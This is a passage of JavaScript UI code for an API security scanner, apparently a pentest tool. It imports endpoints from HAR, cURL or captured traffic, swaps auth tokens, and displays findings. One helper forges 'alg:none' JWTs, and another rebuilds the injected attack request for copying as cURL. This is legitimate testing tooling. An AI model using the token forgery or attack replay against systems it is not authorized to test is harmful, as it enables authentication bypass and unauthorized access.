      <span class="${mCls}" style="margin-top:1px;${scanning ? "opacity:.5" : ""}">${e.method}</span>
      <span class="req-url" style="${scanning ? "opacity:.45" : ""}">${_asEsc(e.url)}</span>
      ${badge}
    </div>`;
  }).join("");
}

function asToggleCheck(id, checked) {
  _asChecked[id] = checked;
  _asUpdateScanBtn();
  // Re-render so the warning banner ("already scanned") updates live
  _asRenderList();
}
function asSelectAll()   {
  // Select everything except in-progress (scanned rows stay selectable)
  _asEntries.forEach(e => {
    const key = _asUrlKey(e.url);
    if (!_asScanningUrls.has(key)) _asChecked[e.id] = true;
  });
  _asRenderList(); _asUpdateScanBtn();
}
function asDeselectAll() { _asEntries.forEach(e=>{ _asChecked[e.id]=false; }); _asRenderList(); _asUpdateScanBtn(); }

function _asUpdateScanBtn() {
  const btn   = document.getElementById("as-scan-btn");
  const count = Object.values(_asChecked).filter(Boolean).length;
  if (!btn) return;
  btn.disabled = count === 0;
  // While a scan is running OR there's a completed job (results accumulate until Reset)
  if (((_asScanState === "running" || _asScanState === "paused_auth")
      || (_asScanState === "done" && _asJobId)) && count > 0) {
    btn.textContent = `➕ Add to Scan (${count} selected)`;
    btn.title = (_asScanState === "running" || _asScanState === "paused_auth")
      ? "Add selected APIs to the running scan queue"
      : "Scan selected APIs — results will be appended (Reset to start fresh)";
  } else {
    btn.textContent = count > 0 ? `🔍 Active Scan (${count} selected)` : "🔍 Active Scan (0 selected)";
    btn.title = "";
  }
}

// ── AV Capture import — modal with filter ─────────────────────────────────────
let _asAVAllEntries  = [];        // pre-processed unique entries from AV Capture
let _asAVSelDomains  = new Set(); // domains currently selected in the modal
let _asAVFilterText  = "";        // URL text filter

function asImportFromAV() {
  const reqs = (window._avState && window._avState.requests) || [];
  if (!reqs.length) {
    alert("No requests in API Validator Capture.\n\nCapture or import requests in API Validator Pro first.");
    return;
  }

  // Pre-process once: deduplicate by method + base-URL
  const seen = new Set(), entries = [];
  reqs.forEach(r => {
    const method = (r.method||"GET").toUpperCase(), url = r.url||"";
    if (!url.startsWith("http") || _AS_STATIC_EXTS.test(url.split("?")[0])) return;
    const key = method+":"+url.split("?")[0];
    if (seen.has(key)) return; seen.add(key);
    entries.push({ id:_asUUID(), method, url, headers:r.headers||{}, body:r.body||"" });
  });
  if (!entries.length) { _asShowToast("No API requests found in AV Capture"); return; }

  _asAVAllEntries = entries;
  _asAVFilterText  = "";

  // Collect unique hostnames — all selected by default
  const domains = new Set();
  entries.forEach(e => { try { domains.add(new URL(e.url).hostname); } catch {} });
  _asAVSelDomains = new Set(domains);

  // Render domain chips
  const chipsEl = document.getElementById("as-av-domain-chips");
  if (chipsEl) {
    if (domains.size === 1) {
      // Only one domain — no point showing chips, hide the section
      chipsEl.closest(".as-av-section").style.display = "none";
    } else {
      chipsEl.closest(".as-av-section").style.display = "";
      chipsEl.innerHTML = [...domains].sort().map(d =>
        `<span class="as-av-domain-chip active" data-domain="${_asEsc(d)}"
               onclick="_asAVToggleDomain('${d.replace(/'/g,"\\'")}',this)">${_asEsc(d)}</span>`
      ).join("")
        + `<span class="as-av-domain-chip as-av-chip-all" onclick="_asAVToggleAll()">All / None</span>`;
    }
  }

  // Clear filter input and refresh preview
  const inp = document.getElementById("as-av-filter-inp");
  if (inp) inp.value = "";

  // Show total available
  const totalEl = document.getElementById("as-av-total-cnt");
  if (totalEl) totalEl.textContent = `${entries.length} unique endpoint${entries.length!==1?"s":""} available`;

  _asAVUpdatePreview();

  const modal = document.getElementById("as-av-modal");
  if (modal) modal.style.display = "flex";
  setTimeout(() => { const i = document.getElementById("as-av-filter-inp"); if(i) i.focus(); }, 80);
}

function _asAVToggleDomain(domain, el) {
  if (_asAVSelDomains.has(domain)) { _asAVSelDomains.delete(domain); el.classList.remove("active"); }
  else                             { _asAVSelDomains.add(domain);    el.classList.add("active"); }
  _asAVUpdatePreview();
}

function _asAVToggleAll() {
  const chips = document.querySelectorAll("#as-av-domain-chips .as-av-domain-chip[data-domain]");
  const allOn = [...chips].every(c => c.classList.contains("active"));
  chips.forEach(c => {
    const d = c.dataset.domain;
    if (allOn) { _asAVSelDomains.delete(d); c.classList.remove("active"); }
    else       { _asAVSelDomains.add(d);    c.classList.add("active"); }
  });
  _asAVUpdatePreview();
}

function _asAVFilteredEntries() {
  const txt = _asAVFilterText.trim().toLowerCase();
  return _asAVAllEntries.filter(e => {
    let hostname = "";
    try { hostname = new URL(e.url).hostname; } catch {}
    if (!_asAVSelDomains.has(hostname)) return false;
    if (txt && !e.url.toLowerCase().includes(txt)) return false;
    return true;
  });
}

function _asAVUpdatePreview() {
  const filtered     = _asAVFilteredEntries();
  const existingKeys = new Set(_asEntries.map(e => e.method+":"+e.url.split("?")[0]));
  const newEntries   = filtered.filter(e => !existingKeys.has(e.method+":"+e.url.split("?")[0]));
  const skipCount    = filtered.length - newEntries.length;
  const filteredOut  = _asAVAllEntries.length - filtered.length;

  const previewEl = document.getElementById("as-av-preview");
  if (previewEl) {
    const rows = [];
    if (newEntries.length)
      rows.push(`<span class="as-av-pr-new">✓ ${newEntries.length} new endpoint${newEntries.length!==1?"s":""} will be added</span>`);
    if (skipCount)
      rows.push(`<span class="as-av-pr-skip">↷ ${skipCount} already in list (skipped)</span>`);
    if (filteredOut)
      rows.push(`<span class="as-av-pr-filt">✗ ${filteredOut} filtered out</span>`);
    if (!newEntries.length && !skipCount)
      rows.push(`<span class="as-av-pr-none">No matching endpoints</span>`);
    previewEl.innerHTML = rows.join("");
  }

  const btn = document.getElementById("as-av-import-btn");
  if (btn) {
    const n = newEntries.length;
    btn.textContent = n ? `✅ Import ${n} endpoint${n!==1?"s":""}` : "Nothing new to import";
    btn.disabled    = !n;
    btn.style.opacity = n ? "1" : "0.5";
    btn.style.cursor  = n ? "pointer" : "default";
  }
}

function asCancelAVModal() {
  const modal = document.getElementById("as-av-modal");
  if (modal) modal.style.display = "none";
}

function asConfirmAVImport() {
  const filtered     = _asAVFilteredEntries();
  const existingKeys = new Set(_asEntries.map(e => e.method+":"+e.url.split("?")[0]));
  const newEntries   = filtered.filter(e => !existingKeys.has(e.method+":"+e.url.split("?")[0]));

  if (!newEntries.length) { _asShowToast("No new endpoints to add"); return; }

  // APPEND — never wipe existing entries (Scanned / In-progress survive)
  newEntries.forEach(e => { _asEntries.push(e); _asChecked[e.id] = false; });
  _asRenderList();
  _asUpdateScanBtn();
  asCancelAVModal();
  _asShowToast(`✓ ${newEntries.length} endpoint${newEntries.length!==1?"s":""} added`);
}

// ── cURL import modal ─────────────────────────────────────────────────────────
function asShowCurlModal() {
  const modal = document.getElementById("as-curl-modal");
  const inp   = document.getElementById("as-curl-input");
  if (modal) modal.style.display = "flex";
  if (inp)   { inp.value = ""; setTimeout(()=>inp.focus(), 80); }
}
function asCancelCurlModal() {
  const m = document.getElementById("as-curl-modal");
  if (m) m.style.display = "none";
}
async function asConfirmCurl() {
  const inp = document.getElementById("as-curl-input");
  const cmd = inp ? inp.value.trim() : "";
  if (!cmd) { inp && inp.focus(); return; }
  try {
    const r = await fetch(`${AS_BASE}/apiscan/parse_curl`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({curl_cmd: cmd}),
    });
    if (!r.ok) { const e=await r.json().catch(()=>({})); alert("Parse error: "+(e.detail||r.statusText)); return; }
    const d = await r.json();
    asCancelCurlModal();
    const entry = {id:_asUUID(), method:d.method, url:d.url, headers:d.headers||{}, body:d.body||""};
    _asEntries.push(entry); _asChecked[entry.id] = false;
    _asRenderList(); _asUpdateScanBtn();
    _asShowToast(`Added: ${d.method} ${d.url}`);
  } catch(e) { alert("Error contacting backend: "+e.message); }
}

// ── HAR upload + token override modal ─────────────────────────────────────────
let _asPendingHarEntries = null;   // parsed entries awaiting token Apply / Skip

function asTriggerHarUpload() {
  const inp = document.getElementById("as-har-input");
  if (!inp) return;
  inp.value = "";
  inp.click();
}

function _asNormalizeAuthToken(raw) {
  let tok = String(raw || "").trim();
  if (!tok) return "";
  if (/^(bearer|basic)\s+/i.test(tok)) return tok;
  // Raw JWT → Bearer …
  if (tok.split(".").length === 3 && tok.startsWith("eyJ")) return "Bearer " + tok;
  // Opaque access token — most APIs expect Bearer
  return "Bearer " + tok;
}

function _asExtractAuthFromEntries(entries) {
  for (const e of entries || []) {
    const hdrs = e.headers || {};
    const k = Object.keys(hdrs).find(x => x.toLowerCase() === "authorization");
    if (k && String(hdrs[k] || "").trim()) return String(hdrs[k]).trim();
  }
  return "";
}

function _asParseHarToEntries(har) {
  const raw = (har && har.log && har.log.entries) || [];
  const seen = new Map(); // method::baseUrl → index
  const entries = [];

  for (const e of raw) {
    const req = e.request || {};
    const url = req.url || "";
    if (!url.startsWith("http")) continue;
    if (_AS_STATIC_EXTS.test(url.split("?")[0])) continue;

    const method = (req.method || "GET").toUpperCase();
    const baseUrl = url.split("?")[0];
    const key = method + "::" + baseUrl;

    const headers = {};
    for (const h of (req.headers || [])) {
      if (!h || !h.name) continue;
      const name = String(h.name);
      if (name.startsWith(":")) continue;
      if (name.toLowerCase() === "content-length") continue;
      headers[name] = h.value == null ? "" : String(h.value);
    }
    // Cookie header often missing in HAR — rebuild from cookies[] when needed
    const hasCookie = Object.keys(headers).some(k => k.toLowerCase() === "cookie");
    if (!hasCookie && Array.isArray(req.cookies) && req.cookies.length) {
      const cookieStr = req.cookies
        .filter(c => c && c.name)
        .map(c => `${c.name}=${c.value == null ? "" : c.value}`)
        .join("; ");
      if (cookieStr) headers["Cookie"] = cookieStr;
    }

    let body = "";
    const postData = req.postData;
    if (postData && postData.text != null) {
      body = typeof postData.text === "string" ? postData.text : String(postData.text);
    }

    if (seen.has(key)) {
      // Keep first URL (may include richer query); merge any missing headers
      const existing = entries[seen.get(key)];
      for (const [hk, hv] of Object.entries(headers)) {
        const ek = Object.keys(existing.headers).find(x => x.toLowerCase() === hk.toLowerCase());
        if (!ek) existing.headers[hk] = hv;
        else if (!String(existing.headers[ek] || "").trim() && String(hv || "").trim())
          existing.headers[ek] = hv;
      }
      if (!existing.body && body) existing.body = body;
      // Prefer URL that has a query string if the kept one does not
      if ((!existing.url.includes("?")) && url.includes("?")) existing.url = url;
      continue;
    }

    seen.set(key, entries.length);
    entries.push({
      id: _asUUID(),
      method,
      url,
      headers,
      body: body || "",
    });
  }
  return entries;
}

function _asApplyAuthOverride(entries, token) {
  const auth = _asNormalizeAuthToken(token);
  if (!auth) return entries;
  return (entries || []).map(e => {
    const hdrs = Object.assign({}, e.headers || {});
    Object.keys(hdrs).forEach(k => {
      if (k.toLowerCase() === "authorization") delete hdrs[k];
    });
    hdrs["Authorization"] = auth;
    return Object.assign({}, e, { headers: hdrs });
  });
}

function _asCommitHarEntries(entries, note) {
  if (!entries || !entries.length) {
    _asShowToast("No API requests to import");
    return;
  }
  const existingKeys = new Set(_asEntries.map(e => e.method + ":" + e.url.split("?")[0]));
  const fresh = entries.filter(e => !existingKeys.has(e.method + ":" + e.url.split("?")[0]));
  const skipped = entries.length - fresh.length;
  fresh.forEach(e => {
    if (!e.id) e.id = _asUUID();
    _asEntries.push(e);
    _asChecked[e.id] = false;
  });
  _asRenderList();
  _asUpdateScanBtn();
  let msg = `✓ ${fresh.length} endpoint${fresh.length !== 1 ? "s" : ""} from HAR`;
  if (note) msg += ` · ${note}`;
  if (skipped) msg += ` (${skipped} already in list)`;
  _asShowToast(msg);
}

async function asOnHarFileSelected(ev) {
  const file = ev && ev.target && ev.target.files && ev.target.files[0];
  if (!file) return;
  try {
    const text = await file.text();
    const har = JSON.parse(text);
    const entries = _asParseHarToEntries(har);
    if (!entries.length) {
      alert("No API requests found in this HAR.\n\nTip: export HAR with sensitive data so Authorization headers are included, and avoid static-only captures.");
      return;
    }
    _asPendingHarEntries = entries;
    const autoTok = _asExtractAuthFromEntries(entries);
    const sub = document.getElementById("as-har-token-sub");
    if (sub) {
      sub.textContent = autoTok
        ? `${entries.length} API request${entries.length !== 1 ? "s" : ""} parsed · Authorization found in HAR — replace if expired, or Skip to keep it.`
        : `${entries.length} API request${entries.length !== 1 ? "s" : ""} parsed · No Authorization in HAR (export “with sensitive data” or paste a token). Skip keeps Cookie/other headers as-is.`;
    }
    const inp = document.getElementById("as-har-token-input");
    if (inp) inp.value = autoTok || "";
    const modal = document.getElementById("as-har-token-modal");
    if (modal) modal.style.display = "flex";
    setTimeout(() => { if (inp) { inp.focus(); inp.select(); } }, 80);
  } catch (ex) {
    alert("HAR parse error: " + (ex && ex.message ? ex.message : ex));
  } finally {
    if (ev && ev.target) ev.target.value = "";
  }
}

function asCancelHarTokenModal() {
  _asPendingHarEntries = null;
  const modal = document.getElementById("as-har-token-modal");
  if (modal) modal.style.display = "none";
}

function asSkipHarToken() {
  const entries = _asPendingHarEntries;
  asCancelHarTokenModal();
  if (!entries) return;
  _asCommitHarEntries(entries, "HAR tokens kept");
}

function asConfirmHarToken() {
  const inp = document.getElementById("as-har-token-input");
  const tok = inp ? inp.value.trim() : "";
  if (!tok) {
    _asShowToast("Token empty — use Skip to keep HAR tokens, or paste a token");
    if (inp) inp.focus();
    return;
  }
  const entries = _asPendingHarEntries;
  asCancelHarTokenModal();
  if (!entries) return;
  _asCommitHarEntries(_asApplyAuthOverride(entries, tok), "token overridden");
}

// ── Params modal ──────────────────────────────────────────────────────────────

function _asParamKey(p) { return `${p.entry_id}::${p.param_name}`; }

// Per-param "regenerate per probe" toggles
let _asParamRegenMap = {};   // {key: bool}

function _asToggleRegen(idx) {
  const p = _asParamsList[idx];
  if (!p) return;
  const key  = _asParamKey(p);
  const nowOn = !_asParamRegenMap[key];
  _asParamRegenMap[key] = nowOn;
  _asApplyRegenBtn(idx, nowOn);
}

// Shared helper to update the regen button appearance
function _asApplyRegenBtn(idx, on) {
  const btn = document.getElementById(`as-pm-regen-${idx}`);
  if (!btn) return;
  btn.classList.toggle("as-regen-active", on);
  btn.textContent = on ? "🔁" : "🔒";
  btn.title = on
    ? "Regenerate per probe: ON — a fresh value is generated for every probe"
    : "🔒 Fixed — same custom value used for all probes. Click to enable per-probe regen.";
}

// Called by oninput on the custom-value input
function _asParamValInput(idx, value) {
  const p = _asParamsList[idx];
  if (!p) return;
  const key      = _asParamKey(p);
  const nonEmpty = value.trim().length > 0;
  _asParamCustomVals[key] = value;

  // Auto-check if user typed something
  const chk = document.getElementById(`as-pm-chk-${idx}`);
  if (chk) chk.checked = nonEmpty;

  // Amber tint when input contains a format token
  const inp = document.getElementById(`as-pm-val-${idx}`);
  if (inp) inp.classList.toggle("as-fmt-input", nonEmpty && _asIsFmtStr(value));

  // Auto-enable regen when value is non-empty; turn it off when field is cleared
  if (nonEmpty && !_asParamRegenMap[key]) {
    _asParamRegenMap[key] = true;
    _asApplyRegenBtn(idx, true);
  }
  if (!nonEmpty && _asParamRegenMap[key]) {
    _asParamRegenMap[key] = false;
    _asApplyRegenBtn(idx, false);
  }
}

function _asParamToggle(idx, checked) {
  const p = _asParamsList[idx];
  if (!p) return;
  const key = _asParamKey(p);
  if (!checked) {
    delete _asParamCustomVals[key];
    const inp = document.getElementById(`as-pm-val-${idx}`);
    if (inp) inp.value = "";
    // Also reset regen to OFF so unchecking fully removes this param from the scan
    _asParamRegenMap[key] = false;
    _asApplyRegenBtn(idx, false);
  }
}

// ── Type-picker popup ─────────────────────────────────────────────────────────
const _AS_TYPES = [
  { key: "uuid",    label: "🔑 UUID",       hint: "→ {uuid}"        },
  { key: "int",     label: "🔢 Integer",    hint: "→ {num:N}"       },
  { key: "email",   label: "📧 Email",      hint: "→ {email}"       },
  { key: "hex",     label: "#️⃣ Hex Token", hint: "→ {hex:N}"       },
  { key: "alphanum",label: "🔤 Alphanum",   hint: "→ {alphanum:N}"  },
  { key: "alpha",   label: "🅰️ Alpha",      hint: "→ {alpha:N}"     },
  { key: "bool",    label: "✅ Boolean",    hint: "true / false"    },
];

// Convert a type key into a format template string (same tokens as PT Tester)
function _asTypeToFmt(typeKey, cv, pn) {
  const v = String(cv || ""), n = (pn || "").toLowerCase();
  switch (typeKey) {
    case "uuid":     return "{uuid}";
    case "email":    return "{email}";
    case "int":      {
      // Match digit count of the current value, default 6
      const digits = /^\d+$/.test(v) ? Math.max(v.length, 1) : 6;
      return `{num:${digits}}`;
    }
    case "hex":      {
      const len = /^[0-9a-f]+$/i.test(v) ? v.length : 16;
      return `{hex:${len}}`;
    }
    case "alphanum": {
      const len = v.length > 0 ? Math.min(v.length, 12) : 8;
      return `{alphanum:${len}}`;
    }
    case "alpha":    {
      const len = v.length > 0 ? Math.min(v.length, 12) : 8;
      return `{alpha:${len}}`;
    }
    case "bool":     return /^true$/i.test(v) ? "false" : "true";
    default:         return _asAutoFmt(cv, pn);
  }
}

// Auto-detect best format template from current value / param name
function _asAutoFmt(cv, pn) {
  const v = String(cv || ""), n = (pn || "").toLowerCase();
  if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v))
    return "{uuid}";
  if (n.includes("email") || /@/.test(v))
    return "{email}";
  if (/^\d+$/.test(v) && v.length >= 1 && v.length <= 15)
    return `{num:${v.length}}`;
  if (/^[0-9a-f]{8,}$/i.test(v))
    return `{hex:${v.length}}`;
  if (/^(true|false)$/i.test(v))
    return /^true$/i.test(v) ? "false" : "true";
  const len = v.length > 0 ? Math.min(v.length, 12) : 8;
  return `{alphanum:${len}}`;
}

// Check whether a string is a format template (contains {token})
function _asIsFmtStr(s) {
  return /\{[^}]+\}/.test(s);
}

// ── cURL builder (for Results copy button) ────────────────────────────────────
// Builds a shell-safe cURL from an entry {method, url, headers, body}.
function _asBuildCurlFromEntry(entry) {
  const method = (entry.method || "GET").toUpperCase();
  const url    = entry.url  || "";
  const hdrs   = entry.headers || {};
  const body   = entry.body || "";
  if (!url) return "";

  const skip  = new Set(["content-length","transfer-encoding","connection","host"]);
  const lines = [`curl -X ${method}`];

  for (const [k, v] of Object.entries(hdrs)) {
    if (!skip.has(k.toLowerCase())) {
      // Shell-safe single-quote: replace ' with '\''
      const safeV = String(v).replace(/'/g, "'\\''");
      lines.push(`  -H '${k}: ${safeV}'`);
    }
  }
  if (body) {
    const safeBody = body.replace(/'/g, "'\\''");
    lines.push(`  --data-raw '${safeBody}'`);
  }
  const safeUrl = url.replace(/'/g, "'\\''");
  lines.push(`  '${safeUrl}'`);
  return lines.join(" \\\n");
}

// Forge alg:none JWT from an original Authorization / header value (UI fallback
// when backend did not attach attack_request — e.g. older scan results).
function _asForgeJwtNone(origVal, algLabel) {
  const raw = String(origVal || "").trim();
  if (!raw) return null;
  const m = raw.match(/^(Bearer\s+)(.+)$/i);
  const prefix = m ? m[1] : "";
  const tok = m ? m[2] : raw;
  const parts = tok.split(".");
  if (parts.length < 2) return null;
  try {
    let hB64 = parts[0].replace(/-/g, "+").replace(/_/g, "/");
    while (hB64.length % 4) hB64 += "=";
    const hdr = JSON.parse(atob(hB64));
    const alg = (String(algLabel || "none").replace(/^alg=/i, "") || "none");
    hdr.alg = alg;
    const enc = btoa(JSON.stringify(hdr)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    return prefix + enc + "." + parts[1] + ".";
  } catch {
    return null;
  }
}

// Build the exact attack request for an issue (for REQUEST panel + Copy cURL).
// Prefer backend attack_request (from matching probe); else reconstruct locally.
function _asBuildAttackRequest(entry, iss) {
  const ar = iss && iss.attack_request;
  if (ar && ar.url) {
    return {
      method:  ar.method || entry.method || "GET",
      url:     ar.url,
      headers: Object.assign({}, ar.headers || {}),
      body:    (ar.body || "").trim(),
    };
  }

  const payload = (iss.payload   || "").trim();
  const param   = (iss.parameter || "").trim();
  let method = entry.method || "";
  let url    = entry.url || iss.url || "";
  if (!method && url) {
    const mx = url.match(/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(https?:\/\/.+)$/i);
    if (mx) { method = mx[1].toUpperCase(); url = mx[2]; }
  }
  method = method || "GET";
  const hdrs = Object.assign({}, entry.headers || {});
  let body = (entry.body || "").trim();

  if (param && payload) {
    try {
      const uo = new URL(url);
      if (uo.searchParams.has(param)) {
        uo.searchParams.set(param, payload);
        url = uo.toString();
      }
    } catch {}

    const hdrKey = Object.keys(hdrs).find(k => k.toLowerCase() === param.toLowerCase());
    if (hdrKey) {
      // JWT findings store payload as "alg=none" — forge the real token for Copy
      const vuln = (iss.vulnerability || "").toUpperCase();
      if (/JWT/.test(vuln) && /^alg=/i.test(payload)) {
        const forged = _asForgeJwtNone(hdrs[hdrKey], payload);
        hdrs[hdrKey] = forged || payload;
      } else {
        hdrs[hdrKey] = payload;
      }
    } else if (body) {
      try {
        const obj = JSON.parse(body);
        if (_asJsonSetPath(obj, param, payload)) {
          body = JSON.stringify(obj);
        }
      } catch {}
    }
  }

  return { method, url, headers: hdrs, body };
}

// Copy the selected issue's cURL to clipboard.
function _asCopySelectedResultCurl() {
  if (!_asSelResultCurl) { _asShowToast("No attack cURL available for this issue"); return; }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(_asSelResultCurl).then(
      ()  => _asShowToast("📋 Attack cURL copied — paste in Postman to verify"),
      ()  => _asFallbackCopy(_asSelResultCurl)
    );
  } else {
    _asFallbackCopy(_asSelResultCurl);
  }
}

function _asFallbackCopy(text) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.cssText = "position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none";
  document.body.appendChild(ta);
  ta.focus(); ta.select();
  try {
    document.execCommand("copy");
    _asShowToast("📋 cURL copied to clipboard");
  } catch(_e) {
    _asShowToast("Copy failed — please copy manually");
  }
  document.body.removeChild(ta);
}

// ── Results detail panel ──────────────────────────────────────────────────────

// Pretty-print a JSON string; return raw string on parse error.
function _asFmtJson(s) {
  if (!s) return s;
  try { return JSON.stringify(JSON.parse(s), null, 2); }
  catch { return s; }
}

// Set value at a simple path (flat key or dot-notation) inside a parsed JSON
// object, coercing to the original value's type.  Returns true if the key was
// found and updated.
function _asJsonSetPath(obj, path, rawVal) {
  try {
    // Normalise array notation:  "ids[0]" → "ids.0"
    const keys = path.replace(/\[(\d+)\]/g, ".$1").split(".");
    let d = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      const k = keys[i];
      if (d == null || !(k in Object(d))) return false;
      d = d[k];
    }
    const last = keys[keys.length - 1];
    if (d == null || !(last in Object(d))) return false;
    const orig = d[last];
    if (typeof orig === "number") {
      const n = Number(rawVal);
      d[last] = isNaN(n) ? rawVal : n;
    } else if (typeof orig === "boolean") {
      d[last] = rawVal === "true";
    } else {
      d[last] = rawVal;
    }
    return true;
  } catch { return false; }
}

// Case-insensitive highlight for the detail panel search boxes.
function _asRdHighlight(rawText, query) {
  const s = String(rawText || "");
  const q = String(query  || "").trim();
  if (!q || q.length < 1) return _asEsc(s);
  const parts = [];
  const ql = q.toLowerCase();
  let last = 0, i;
  while ((i = s.toLowerCase().indexOf(ql, last)) !== -1) {
    parts.push(_asEsc(s.slice(last, i)));
    parts.push(`<mark class="as-rd-mark">${_asEsc(s.slice(i, i + q.length))}</mark>`);
    last = i + q.length;
  }
  parts.push(_asEsc(s.slice(last)));
  return parts.join("");
}

// Select an issue row → populate the split REQUEST / RESPONSE detail panel.
//
// Key behaviour:
//  • Shows the FULL request (method + URL + all headers + body).
//  • Substitutes the base value with the ACTUAL injected payload so the panel
//    shows what was really sent (e.g. customerid: -1, not customerid: 1).
//  • Highlights the payload string wherever it appears (amber mark).
//  • Stores plain text in _asRdRaw for live search, HTML in _asRdBase so
//    payload marks are restored when the search field is cleared.
function _asSelectResult(idx) {
  _asSelResultIdx = idx;

  document.querySelectorAll(".as-result-row").forEach((r, i) =>
    r.classList.toggle("as-result-selected", i === idx));

  // ── Retrieve the issue ─────────────────────────────────────────────────
  // Must apply the SAME filters as _asRenderResults so that idx matches the
  // rendered row — including _asHideFP and severity filter.
  const entriesDone = (_asResults && _asResults.entries_done) || [];
  const allIssues   = [];
  entriesDone.forEach(ed => {
    const entry = ed.entry || {};
    (ed.issues||[]).forEach(iss =>
      allIssues.push({...iss, _entry: entry, _method: entry.method||"", _url: entry.url||""}));
  });
  let filtered = _asSevFilter === "ALL"
    ? allIssues
    : allIssues.filter(i => (i.severity||"INFO").toUpperCase() === _asSevFilter);
  // ← same FP filter that _asRenderResults applies
  if (_asHideFP) filtered = filtered.filter(i => i.confirmed !== false);
  const iss = filtered[idx];
  if (!iss) return;

  const entry   = iss._entry || {};
  const payload = (iss.payload   || "").trim();
  const param   = (iss.parameter || "").trim();

  // Prefer backend attack_request (exact probe), else local reconstruct / JWT forge.
  // "Copy cURL" must be the forged/injected request — not the baseline capture.
  const attack    = _asBuildAttackRequest(entry, iss);
  const method    = attack.method;
  const reconUrl  = attack.url;
  const reconHdrs = attack.headers;
  const reconBody = attack.body;

  _asSelResultCurl = _asBuildCurlFromEntry({
    method, url: reconUrl, headers: reconHdrs, body: reconBody,
  });

  const hdrLines = Object.entries(reconHdrs).map(([k, v]) => `${k}: ${v}`).join("\n");
  const fmtBody  = reconBody ? _asFmtJson(reconBody) : "";

  let reqText = `${method} ${reconUrl}`;
  if (hdrLines) reqText += `\n\n${hdrLines}`;
  if (fmtBody)  reqText += `\n\n${fmtBody}`;

  // ── Response text ──────────────────────────────────────────────────────
  const respText = (iss.response_snippet || "").trim() || "(no response snippet available)";

  // CWE / confidence / remediation are kept in the data (and CSV/HTML exports)
  // but intentionally not rendered in the detail panel — they cluttered the UI.
  const remEl = document.getElementById("as-rd-remediation");
  if (remEl) { remEl.style.display = "none"; remEl.innerHTML = ""; }

  // Confirm banner removed — Status column in the table is enough.
  const confBanner = document.getElementById("as-rd-confirm-banner");
  if (confBanner) { confBanner.style.display = "none"; confBanner.innerHTML = ""; }

  // ── REQUEST panel title — param badge (+ IDOR handoff when relevant) ───
  const reqTitleEl = document.getElementById("as-rd-req-title");
  if (reqTitleEl) {
    const paramLbl = param
      ? ` <span class="as-probe-param-lbl" title="Tested parameter">${_asEsc(param)}</span>`
      : "";
    const vulnU = (iss.vulnerability || "").toUpperCase();
    const isIdor = /IDOR|BOLA|BROKEN\s*OBJECT/.test(vulnU);
    const handoff = isIdor
      ? ` <button type="button" class="btn-sm as-idor-handoff-btn" onclick="event.stopPropagation();asSendToIdorTester(${idx})" ` +
        `title="Confirm with dual-token BOLA in IDOR Tester">🔍 IDOR Tester</button>`
      : "";
    reqTitleEl.innerHTML = `📤 REQUEST${paramLbl}${handoff}`;
  }

  // ── Store in module-level buffers (avoids dataset API fragility) ───────
  _asRdRaw.req   = reqText;
  _asRdBase.req  = payload ? _asHighlightPayload(reqText,  payload) : _asEsc(reqText);
  _asRdRaw.resp  = respText;
  _asRdBase.resp = payload ? _asHighlightPayload(respText, payload) : _asEsc(respText);

  // ── Render panels ──────────────────────────────────────────────────────
  const reqEl  = document.getElementById("as-rd-req-body");
  const respEl = document.getElementById("as-rd-resp-body");
  if (reqEl)  reqEl.innerHTML  = _asRdBase.req;
  if (respEl) respEl.innerHTML = _asRdBase.resp;

  // Reset search inputs
  const rqs = document.getElementById("as-rd-req-search");
  const rss = document.getElementById("as-rd-resp-search");
  if (rqs) rqs.value = "";
  if (rss) rss.value = "";

  // Show the panel
  const detail = document.getElementById("as-result-detail");
  if (detail) detail.style.display = "flex";
}

// Live search / highlight inside a detail panel.
// • Empty query  → restores the payload-highlighted base HTML (_asRdBase).
// • Non-empty    → case-insensitive highlight of the search term (_asRdRaw).
function _asRdSearch(side, query) {
  const elId = side === "req" ? "as-rd-req-body" : "as-rd-resp-body";
  const el   = document.getElementById(elId);
  if (!el) return;

  // Use module-level buffers set by _asSelectResult; fall back to DOM text
  const rawText  = _asRdRaw[side]  || el.textContent || "";
  const baseHtml = _asRdBase[side] || _asEsc(rawText);

  const q = query.trim();
  if (!q) {
    el.innerHTML = baseHtml;   // restore payload-highlighted view
    return;
  }
  el.innerHTML = _asRdHighlight(rawText, q);
}

// Close / hide the detail panel.
function _asCloseResultDetail() {
  const detail = document.getElementById("as-result-detail");
  if (detail) detail.style.display = "none";
  const confBanner = document.getElementById("as-rd-confirm-banner");
  if (confBanner) { confBanner.style.display = "none"; confBanner.innerHTML = ""; }
  _asSelResultIdx  = null;
  _asSelResultCurl = "";
  document.querySelectorAll(".as-result-row").forEach(r =>
    r.classList.remove("as-result-selected"));
}

// Legacy: generate a concrete value for "⚡ Auto-fill All" display hint
function _asAutoGen(cv, pn) {
  const v = String(cv || ""), n = (pn || "").toLowerCase();
  if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v)) return _asUUID();
  if (n.includes("email") || /@/.test(v))
    return `test_${Math.random().toString(36).slice(2, 9)}@example.com`;
  if (/^\d+$/.test(v) && v.length <= 12) {
    const lo = 10 ** (Math.max(v.length, 1) - 1), hi = 10 ** v.length - 1;
    return String(Math.floor(Math.random() * (hi - lo + 1)) + lo);
  }
  if (/^[0-9a-f]{16,}$/i.test(v))
    return Array.from(crypto.getRandomValues(new Uint8Array(v.length / 2 || 8)))
                .map(b => b.toString(16).padStart(2, "0")).join("");
  if (/^(true|false)$/i.test(v)) return /^true$/i.test(v) ? "false" : "true";
  return Math.random().toString(36).slice(2, 12);
}

let _asPickerActiveIdx = -1;

function _asOpenTypePicker(idx, btnEl) {
  // Close if clicking the same button again
  const existing = document.getElementById("as-type-picker");
  if (existing) {
    existing.remove();
    if (_asPickerActiveIdx === idx) { _asPickerActiveIdx = -1; return; }
  }
  _asPickerActiveIdx = idx;

  const picker = document.createElement("div");
  picker.id = "as-type-picker";
  picker.className = "as-type-picker";
  picker.innerHTML = _AS_TYPES.map(t => `
